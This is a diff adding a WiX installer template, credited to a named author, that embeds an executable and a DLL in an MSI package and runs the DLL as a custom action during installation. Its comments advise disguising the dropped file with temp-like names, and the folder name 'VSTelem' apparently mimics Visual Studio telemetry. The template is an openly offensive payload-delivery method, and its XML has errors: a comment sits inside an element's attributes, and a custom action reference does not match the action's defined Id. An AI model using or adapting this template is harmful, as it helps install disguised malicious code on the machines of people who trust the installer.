@@ -1,0 +1,44 @@
+<?xml version='1.0' ?>
+<!--  
+    Sabri Hassanyah (@KINGSABRI)
+    A wxs template to embed executable (DLL) file into the msi package and execute it during installation. 
+-->
+
+<Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>
+   <Product Id='*' UpgradeCode="11111111-2222-3333-4444-555555555555" 
+        Name='My Setup' Language='1033' Version='1.0.0.0' 
+        Manufacturer='Your Company'>
+
+    <Package Description='pak' InstallerVersion='200' Compressed='yes' />
+    <Media Id='1' Cabinet='setup.cab' EmbedCab='yes' />
+    
+    <!-- use a better naming (temp-like naming convention) ex. 4b494e47.icu-->
+    <Directory Id='TARGETDIR' Name='SourceDir'>
+        <Directory Id="TempFolder">
+            <Directory Id="INSTALLLOCATION" Name="VSTelem"> 
+                <Component Id='MyComponent' DiskId='1' Guid=''>
+                    <File Id="File0" Name="smb64.exe" Source="smb64.exe" />
+                </Component>
+            </Directory>
+        </Directory>
+    </Directory> 
+    
+    <Feature Id='InstallFeature' Title='Install Feature' Level='1'>
+        <ComponentRef Id='MyComponent' />
+    </Feature> 
+   
+    <!-- Run Action -->
+    <CustomAction 
+        Id='Installer' 
+        BinaryKey='MyBinaryID' 
+        DllEntry='MyDllEntryFunctionName' <!-- check your DLL entry -->
+        Impersonate='yes' 
+    />
+    <Binary Id='MyBinaryID' SourceFile='MyDLLFile.dll'/>
+
+    <!-- Comment out unwanted actions -->
+    <InstallExecuteSequence>
+        <Custom Action="RunWrapped" After="InstallFiles">NOT REMOVE~="ALL"</Custom>
+    </InstallExecuteSequence>
+   </Product>
+</Wix>
